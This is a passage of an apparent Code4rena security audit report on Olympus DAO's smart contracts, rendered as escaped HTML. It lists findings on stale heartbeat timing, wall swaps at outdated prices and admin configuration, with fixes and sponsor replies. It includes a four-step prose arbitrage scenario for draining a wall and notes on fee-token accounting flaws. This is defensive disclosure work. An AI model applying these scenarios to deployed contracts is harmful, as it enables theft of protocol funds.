3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Proof of Concept</h3>\n<p><a href=\"https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Heart.sol#L92\">https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Heart.sol#L92</a><br>\n<a href=\"https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Heart.sol#L103\">https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Heart.sol#L103</a></p>\n<h3 id=\"recommended-mitigation-steps-32\" style=\"position:relative;\"><a href=\"#recommended-mitigation-steps-32\" aria-label=\"recommended mitigation steps 32 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Recommended Mitigation Steps</h3>\n<p><a href=\"https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Heart.sol#L103\">https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Heart.sol#L103</a><br>\nChange this line to <code>lastBeat = block.timestamp - (block.timestamp - lastBeat) % frequency();</code><br>\nSo no matter how much time the <code>beat()</code> was not called, it is possible to call it only once per <code>frequency()</code>.</p>\n<p><strong><a href=\"https://github.com/code-423n4/2022-08-olympus-findings/issues/79#issuecomment-1239882530\">Oighty (Olympus) confirmed and commented</a>:</strong></p>\n<blockquote>\n<p>See comment on <a href=\"https://github.com/code-423n4/2022-08-olympus-findings/issues/405#issuecomment-1239878294\">#405</a>. This approach actually solves both of our issues though.</p>\n</blockquote>\n<p><strong><a href=\"https://github.com/code-423n4/2022-08-olympus-findings/issues/79#issuecomment-1251018524\">0xean (judge) commented</a>:</strong></p>\n<blockquote>\n<p>Going to use this issue as the primary since the solution is elegant and solves the problem. </p>\n</blockquote>\n<hr>\n<h2 id=\"m-31-protocols-walls--cushion-bonds-remain-active-even-if-heart-is-not-beating\" style=\"position:relative;\"><a href=\"#m-31-protocols-walls--cushion-bonds-remain-active-even-if-heart-is-not-beating\" aria-label=\"m 31 protocols walls  cushion bonds remain active even if heart is not beating permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a><a href=\"https://github.com/code-423n4/2022-08-olympus-findings/issues/89\">[M-31] Protocol’s Walls / cushion bonds remain active even if heart is not beating</a></h2>\n<p><em>Submitted by Trust</em></p>\n<p><a href=\"https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/policies/Operator.sol#L188-L191\">https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/policies/Operator.sol#L188-L191</a><br>\n<a href=\"https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Operator.sol#L272\">https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Operator.sol#L272</a><br>\n<a href=\"https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/policies/Operator.sol#L346\">https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/policies/Operator.sol#L346</a><br></p>\n<p>The Walls of the RBS mechanism offer zero slippage swaps at the high and low of the moving average spread. The capacity to be swapped at these prices is usually very large, so it must make sure to only be enabled when the prices are guaranteed to be synced. However, there is no such check. If beat() is not called for some time, meaning we cannot determine if the current spread is legit, swap() still operates as usual.</p>\n<h3 id=\"impact\" style=\"position:relative;\"><a href=\"#impact\" aria-label=\"impact permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Impact</h3>\n<p>The worst case scenario is that the wall is swapping at a losing price, meaning they can be immediately drained via arbitrage bot.</p>\n<h3 id=\"proof-of-concept-28\" style=\"position:relative;\"><a href=\"#proof-of-concept-28\" aria-label=\"proof of concept 28 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Proof of concept</h3>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"\" data-index=\"49\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\">1. Price is X at the start</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">2. Oracle stops updating for some reason / no one calls beat()</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">3. Price drops to Y , where Y &lt; low wall centered around X</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">4. Attacker can perform arbitrage by buying Ohm at external markets at Y and selling Ohm at low wall price, netting the difference.</span></span></code></pre>\n<h3 id=\"recommended-mitigation-steps-33\" style=\"position:relative;\"><a href=\"#recommended-mitigation-steps-33\" aria-label=\"recommended mitigation steps 33 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Recommended mitigation steps:</h3>\n<p>Change modifier onlyWhileActive to add a check for beat out of sync:</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"\" data-index=\"50\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\">if (block.timestamp &gt; lastBeat + SYNC_THRESHOLD * frequency())</span></span></code></pre>\n<p><strong><a href=\"https://github.com/code-423n4/2022-08-olympus-findings/issues/89#issuecomment-1238784898\">Oighty (Olympus) confirmed and commented</a>:</strong></p>\n<blockquote>\n<p>This is an interesting unintended consequence of a bad price feed or other <code>beat()</code> issue. Your suggested update makes sense, but we will probably adjust slightly to only manage the bad data threshold in one place. </p>\n<p>After originally looking at it, I thought a try/catch block on the external call to <code>PRICE.getLastPrice()</code> in <code>Operator.operate()</code> would work, but it doesn’t handle cases where <code>operate()</code> isn’t reached by the <code>beat()</code> function.</p>\n</blockquote>\n<hr>\n<h2 id=\"m-32-admin-cannot-be-changed-to-eoa-after-deployment\" style=\"position:relative;\"><a href=\"#m-32-admin-cannot-be-changed-to-eoa-after-deployment\" aria-label=\"m 32 admin cannot be changed to eoa after deployment permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a><a href=\"https://github.com/code-423n4/2022-08-olympus-findings/issues/94\">[M-32] Admin cannot be changed to EOA after deployment</a></h2>\n<p><em>Submitted by Jeiwan, also found by datapunk</em></p>\n<p>After contracts are deployed and initialized, the admin address in <code>Kernel</code> contract can only be set to a contract. Granting and revoking roles will be possible to do only via a contract, which looks like an unintended behavior since these operations cannot be performed via governance (the governance contract is designed to be the only executor).</p>\n<h3 id=\"proof-of-concept-29\" style=\"position:relative;\"><a href=\"#proof-of-concept-29\" aria-label=\"proof of concept 29 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Proof of Concept</h3>\n<p>Admin address can be changed to any address (EOA or contract) in the <code>executeAction</code> function in <code>Kernel</code>:<br>\n<a href=\"https://github.com/code-423n4/2022-08-olympus/blob/main/src/Kernel.sol#L252-L253\">https://github.com/code-423n4/2022-08-olympus/blob/main/src/Kernel.sol#L252-L253</a></p>\n<p>This piece explicitly allows EOA addresses since the other actions in the function (besides <code>ChangeExecutor</code>) are checked to have only a contract as the target (see <code>ensureContract</code> function calls in the other actions). This, and the fact that roles cannot be managed via governance, leads to the conclusion that an admin is designed to be an EOA.</p>\n<p>However, in the <code>store</code> function in <code>INSTR</code>, action target can only be a contract:<br>\n<a href=\"https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/INSTR.sol#L52\">https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/INSTR.sol#L52</a></p>\n<p>After the contracts are deployed, <code>INSTR</code> will be the only contract that’s allowed to call <code>Kernel.executeAction</code>:<br>\n<a href=\"https://github.com/code-423n4/2022-08-olympus/blob/main/src/scripts/Deploy.sol#L220\">https://github.com/code-423n4/2022-08-olympus/blob/main/src/scripts/Deploy.sol#L220</a></p>\n<p>Thus, there will be no way to change admin to an EOA. If admin needs to be an EOA, the <code>INSTR</code> contract needs to be patched and re-deployed to allow non-contract targets.</p>\n<h3 id=\"recommended-mitigation-steps-34\" style=\"position:relative;\"><a href=\"#recommended-mitigation-steps-34\" aria-label=\"recommended mitigation steps 34 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Recommended Mitigation Steps</h3>\n<p>Allow EOA addresses as instruction targets or disallow non-contract admin addresses.</p>\n<p><strong><a href=\"https://github.com/code-423n4/2022-08-olympus-findings/issues/94#issuecomment-1234801408\">fullyallocated (Olympus) confirmed and commented</a>:</strong></p>\n<blockquote>\n<p>Nice find + writeup.</p>\n</blockquote>\n<hr>\n<h1 id=\"low-risk-and-non-critical-issues\" style=\"position:relative;\"><a href=\"#low-risk-and-non-critical-issues\" aria-label=\"low risk and non critical issues permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Low Risk and Non-Critical Issues</h1>\n<p>For this contest, 114 reports were submitted by wardens detailing low risk and non-critical issues. The <a href=\"https://github.com/code-423n4/2022-08-olympus-findings/issues/415\">report highlighted below</a> by <strong>zzzitron</strong> received the top score from the judge.</p>\n<p><em>The following wardens also submitted reports: <a href=\"https://github.com/code-423n4/2022-08-olympus-findings/issues/450\">c3phas</a>, <a href=\"https://github.com/code-423n4/2022-08-olympus-findings/issues/500\">hyh</a>, <a href=\"https://github.com/code-423n4/2022-08-olympus-findings/issues/440\">0xNazgul</a>, <a href=\"https://github.com/code-423n4/2022-08-olympus-findings/issues/166\">0xNineDec</a>, <a href=\"https://github.com/code-423n4/2022-08-olympus-findings/issues/27\">Jeiwan</a>, <a href=\"https://github.com/code-423n4/2022-08-olympus-findings/issues/472\">Deivitto</a>, <a href=\"https://github.com/code-423n4/2022-08-olympus-findings/issues/496\">Bahurum</a>, <a href=\"https://github.com/code-423n4/2022-08-olympus-findings/issues/242\">cccz</a>, <a href=\"https://github.com/code-423n4/2022-08-olympus-findings/issues/457\">rbserver</a>, <a href=\"https://github.com/code-423n4/2022-08-olympus-findings/issues/163\">mics</a>, <a href=\"https://github.com/code-423n4/2022-08-olympus-findings/issues/452\">Aymen0909</a>, <a href=\"https://github.com/code-423n4/2022-08-olympus-findings/issues/195\">Rolezn</a>, <a href=\"https://github.com/code-423n4/2022-08-olympus-findings/issues/169\">reassor</a>, <a href=\"https://github.com/code-423n4/2022-08-olympus-findings/issues/168\">ignacio</a>, <a href=\"https://github.com/code-423n4/2022-08-olympus-findings/issues/7\">oyc_109</a>, <a href=\"https://github.com/code-423n4/2022-08-olympus-findings/issues/217\">0xDjango</a>, <a href=\"https://github.com/code-423n4/2022-08-olympus-findings/issues/250\">0xSmartContract</a>, <a href=\"https://github.com/code-423n4/2022-08-olympus-findings/issues/199\">shenwilly</a>, <a href=\"https://github.com/code-423n4/2022-08-olympus-findings/issues/151\">rvierdiiev</a>, <a href=\"https://github.com/code-423n4/2022-08-olympus-findings/issues/233\">Sm4rty</a>, <a href=\"https://github.com/code-423n4/2022-08-olympus-findings/issues/45\">ReyAdmirado</a>, <a href=\"https://github.com/code-423n4/2022-08-olympus-findings/issues/28\">Bnke0x0</a>, <a href=\"https://github.com/code-423n4/2022-08-olympus-findings/issues/148\">Tomo</a>, <a href=\"https://github.com/code-423n4/2022-08-olympus-findings/issues/155\">gogo</a>, <a href=\"https://github.com/code-423n4/2022-08-olympus-findings/issues/17\">robee</a>, <a href=\"https://github.com/code-423n4/2022-08-olympus-findings/issues/22\">fatherOfBlocks</a>, <a href=\"https://github.com/code-423n4/2022-08-olympus-findings/issues/34\">ladboy233</a>, <a href=\"https://github.com/code-423n4/2022-08-olympus-findings/issues/8\">erictee</a>, <a href=\"https://github.com/code-423n4/2022-08-olympus-findings/issues/131\">ElKu</a>, <a href=\"https://github.com/code-423n4/2022-08-olympus-findings/issues/47\">cRat1st0s</a>, <a href=\"https://github.com/code-423n4/2022-08-olympus-findings/issues/374\">GalloDaSballo</a>, <a href=\"https://github.com/code-423n4/2022-08-olympus-findings/issues/49\">Lambda</a>, <a href=\"https://github.com/code-423n4/2022-08-olympus-findings/issues/316\">lukris02</a>, <a href=\"https://github.com/code-423n4/2022-08-olympus-findings/issues/305\">tonisives</a>, <a href=\"https://github.com/code-423n4/2022-08-olympus-findings/issues/138\">Ruhum</a>, <a href=\"https://github.com/code-423n4/2022-08-olympus-findings/issues/30\">durianSausage</a>, <a href=\"https://github.com/code-423n4/2022-08-olympus-findings/issues/396\">dipp</a>, <a href=\"https://github.com/code-423n4/2022-08-olympus-findings/issues/162\">sikorico</a>, <a href=\"https://github.com/code-423n4/2022-08-olympus-findings/issues/268\">IllIllI</a>, <a href=\"https://github.com/code-423n4/2022-08-olympus-findings/issues/473\">0xSky</a>, <a href=\"https://github.com/code-423n4/2022-08-olympus-findings/issues/261\">pfapostol</a>, <a href=\"https://github.com/code-423n4/2022-08-olympus-findings/issues/360\">Rohan16</a>, <a href=\"https://github.com/code-423n4/2022-08-olympus-findings/issues/297\">DimSon</a>, <a href=\"https://github.com/code-423n4/2022-08-olympus-findings/issues/66\">RaymondFam</a>, <a href=\"https://github.com/code-423n4/2022-08-olympus-findings/issues/311\">Waze</a>, <a href=\"https://github.com/code-423n4/2022-08-olympus-findings/issues/400\">devtooligan</a>, <a href=\"https://github.com/code-423n4/2022-08-olympus-findings/issues/372\">0x1f8b</a>, <a href=\"https://github.com/code-423n4/2022-08-olympus-findings/issues/357\">nxrblsrpr</a>, <a href=\"https://github.com/code-423n4/2022-08-olympus-findings/issues/499\">brgltd</a>, <a href=\"https://github.com/code-423n4/2022-08-olympus-findings/issues/363\">delfin454000</a>, <a href=\"https://github.com/code-423n4/2022-08-olympus-findings/issues/356\">BipinSah</a>, <a href=\"https://github.com/code-423n4/2022-08-olympus-findings/issues/165\">bobirichman</a>, <a href=\"https://github.com/code-423n4/2022-08-olympus-findings/issues/115\">datapunk</a>, <a href=\"https://github.com/code-423n4/2022-08-olympus-findings/issues/321\">TomJ</a>, <a href=\"https://github.com/code-423n4/2022-08-olympus-findings/issues/191\">martin</a>, <a href=\"https://github.com/code-423n4/2022-08-olympus-findings/issues/353\">Ch_301</a>, <a href=\"https://github.com/code-423n4/2022-08-olympus-findings/issues/284\">Chandr</a>, <a href=\"https://github.com/code-423n4/2022-08-olympus-findings/issues/460\">ajtra</a>, <a href=\"https://github.com/code-423n4/2022-08-olympus-findings/issues/373\">prasantgupta52</a>, <a href=\"https://github.com/code-423n4/2022-08-olympus-findings/issues/387\">tnevler</a>, <a href=\"https://github.com/code-423n4/2022-08-olympus-findings/issues/466\">rokinot</a>, <a href=\"https://github.com/code-423n4/2022-08-olympus-findings/issues/183\">Guardian</a>, <a href=\"https://github.com/code-423n4/2022-08-olympus-findings/issues/72\">w0Lfrum</a>, <a href=\"https://github.com/code-423n4/2022-08-olympus-findings/issues/228\">CertoraInc</a>, <a href=\"https://github.com/code-423n4/2022-08-olympus-findings/issues/32\">aviggiano</a>, <a href=\"https://github.com/code-423n4/2022-08-olympus-findings/issues/216\">rajatbeladiya</a>, <a href=\"https://github.com/code-423n4/2022-08-olympus-findings/issues/260\">yixxas</a>, <a href=\"https://github.com/code-423n4/2022-08-olympus-findings/issues/280\">__141345__</a>, <a href=\"https://github.com/code-423n4/2022-08-olympus-findings/issues/326\">csanuragjain</a>, <a href=\"https://github.com/code-423n4/2022-08-olympus-findings/issues/364\">ak1</a>, <a href=\"https://github.com/code-423n4/2022-08-olympus-findings/issues/423\">cryptphi</a>, <a href=\"https://github.com/code-423n4/2022-08-olympus-findings/issues/320\">The_GUILD</a>, <a href=\"https://github.com/code-423n4/2022-08-olympus-findings/issues/116\">0x52</a>, <a href=\"https://github.com/code-423n4/2022-08-olympus-findings/issues/129\">carlitox477</a>, <a href=\"https://github.com/code-423n4/2022-08-olympus-findings/issues/14\">ch13fd357r0y3r</a>, <a href=\"https://github.com/code-423n4/2022-08-olympus-findings/issues/238\">sorrynotsorry</a>, <a href=\"https://github.com/code-423n4/2022-08-olympus-findings/issues/307\">PPrieditis</a>, <a href=\"https://github.com/code-423n4/2022-08-olympus-findings/issues/389\">PwnPatrol</a>, <a href=\"https://github.com/code-423n4/2022-08-olympus-findings/issues/433\">Chom</a>, <a href=\"https://github.com/code-423n4/2022-08-olympus-findings/issues/495\">eierina</a>, <a href=\"https://github.com/code-423n4/2022-08-olympus-findings/issues/197\">CodingNameKiki</a>, <a href=\"https://github.com/code-423n4/2022-08-olympus-findings/issues/448\">StevenL</a>, <a href=\"https://github.com/code-423n4/2022-08-olympus-findings/issues/204\">bin2chen</a>, <a href=\"https://github.com/code-423n4/2022-08-olympus-findings/issues/325\">ret2basic</a>, <a href=\"https://github.com/code-423n4/2022-08-olympus-findings/issues/384\">hansfriese</a>, <a href=\"https://github.com/code-423n4/2022-08-olympus-findings/issues/436\">Funen</a>, <a href=\"https://github.com/code-423n4/2022-08-olympus-findings/issues/198\">PaludoX0</a>, <a href=\"https://github.com/code-423n4/2022-08-olympus-findings/issues/425\">Picodes</a>, <a href=\"https://github.com/code-423n4/2022-08-olympus-findings/issues/141\">grGred</a>, <a href=\"https://github.com/code-423n4/2022-08-olympus-findings/issues/444\">okkothejawa</a>, <a href=\"https://github.com/code-423n4/2022-08-olympus-findings/issues/90\">Trust</a>, <a href=\"https://github.com/code-423n4/2022-08-olympus-findings/issues/493\">natzuu</a>, <a href=\"https://github.com/code-423n4/2022-08-olympus-findings/issues/121\">itsmeSTYJ</a>, <a href=\"https://github.com/code-423n4/2022-08-olympus-findings/issues/327\">0x040</a>, <a href=\"https://github.com/code-423n4/2022-08-olympus-findings/issues/454\">d3e4</a>, <a href=\"https://github.com/code-423n4/2022-08-olympus-findings/issues/463\">p_crypt0</a>, <a href=\"https://github.com/code-423n4/2022-08-olympus-findings/issues/150\">0xkatana</a>, <a href=\"https://github.com/code-423n4/2022-08-olympus-findings/issues/160\">Margaret</a>, <a href=\"https://github.com/code-423n4/2022-08-olympus-findings/issues/37\">8olidity</a>, <a href=\"https://github.com/code-423n4/2022-08-olympus-findings/issues/93\">LeoS</a>, <a href=\"https://github.com/code-423n4/2022-08-olympus-findings/issues/504\">medikko</a>, <a href=\"https://github.com/code-423n4/2022-08-olympus-findings/issues/154\">ne0n</a>, <a href=\"https://github.com/code-423n4/2022-08-olympus-findings/issues/282\">EthLedger</a>, <a href=\"https://github.com/code-423n4/2022-08-olympus-findings/issues/365\">enckrish</a>, <a href=\"https://github.com/code-423n4/2022-08-olympus-findings/issues/430\">Diraco</a>, <a href=\"https://github.com/code-423n4/2022-08-olympus-findings/issues/69\">djxploit</a>, <a href=\"https://github.com/code-423n4/2022-08-olympus-findings/issues/229\">JansenC</a>, <a href=\"https://github.com/code-423n4/2022-08-olympus-findings/issues/424\">indijanc</a>, <a href=\"https://github.com/code-423n4/2022-08-olympus-findings/issues/43\">CRYP70</a>, <a href=\"https://github.com/code-423n4/2022-08-olympus-findings/issues/451\">apostle0x01</a>, <a href=\"https://github.com/code-423n4/2022-08-olympus-findings/issues/153\">cloudjunky</a>, <a href=\"https://github.com/code-423n4/2022-08-olympus-findings/issues/252\">MasterCookie</a>, and <a href=\"https://github.com/code-423n4/2022-08-olympus-findings/issues/288\">0x85102</a>.</em></p>\n<h2 id=\"summary-1\" style=\"position:relative;\"><a href=\"#summary-1\" aria-label=\"summary 1 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Summary</h2>\n<table>\n<thead>\n<tr>\n<th>Risk</th>\n<th>Title</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>L‑01</td>\n<td>Operator: incorrect accounting for fee-on-transfer reserve token</td>\n</tr>\n<tr>\n<td>L-02</td>\n<td>BondCallback: incorrect accounting if quoteToken is rebase token</td>\n</tr>\n<tr>\n<td>L-03</td>\n<td>PRICE: unsafe cast for <code>numObservations</code></td>\n</tr>\n<tr>\n<td>L-04</td>\n<td>Operator: unsafe cast for decimals</td>\n</tr>\n<tr>\n<td>L-05</td>\n<td>BondCallback: operator is not set <code>constructor</code></td>\n</tr>\n<tr>\n<td>L-06</td>\n<td>Operator: missing check for configParmas[0] (cushionFactor) in the constructor</td>\n</tr>\n<tr>\n<td>L-07</td>\n<td>Kernel: misplaced zero address check for <code>changeKernel</code></td>\n</tr>\n<tr>\n<td>L-08</td>\n<td>BondCallback, Operator: upon module’s upgrade, the token approval should be revoked</td>\n</tr>\n<tr>\n<td>L-09</td>\n<td>Heart: if the <code>_issueReward</code> fails the heart beat will revert</td>\n</tr>\n<tr>\n<td>N-01</td>\n<td>Kernel: missing zero address check for <code>executor</code> and <code>admin</code></td>\n</tr>\n<tr>\n<td>N-02</td>\n<td>INSTR, Governance: upon module’s upgrade, all instruction data should be carried over to the new modules</td>\n</tr>\n<tr>\n<td>N-03</td>\n<td>RANGE, PRICE: unused import of <code>FullMath</code></td>\n</tr>\n<tr>\n<td>N‑04</td>\n<td>PRICE: stale price</td>\n</tr>\n</tbody>\n</table>\n<h2 id=\"l-01-operator-incorrect-accounting-for-fee-on-transfer-reserve-token\" style=\"position:relative;\"><a href=\"#l-01-operator-incorrect-accounting-for-fee-on-transfer-reserve-token\" aria-label=\"l 01 operator incorrect accounting for fee on transfer reserve token permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>[L-01] Operator: incorrect accounting for fee-on-transfer reserve token</h2>\n<ul>\n<li><a href=\"https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/policies/Operator.sol#L330\">https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/policies/Operator.sol#L330</a></li>\n</ul>\n<p>If the reserve token is fee-to-transfer token and the user is buying ohm, the <code>Operator::swap</code> will incorrectly assume the <code>amountIn_</code> value is transferred, which fails to consider the fees. If the fee is rounded up, the attacker can purchase ohm without giving any 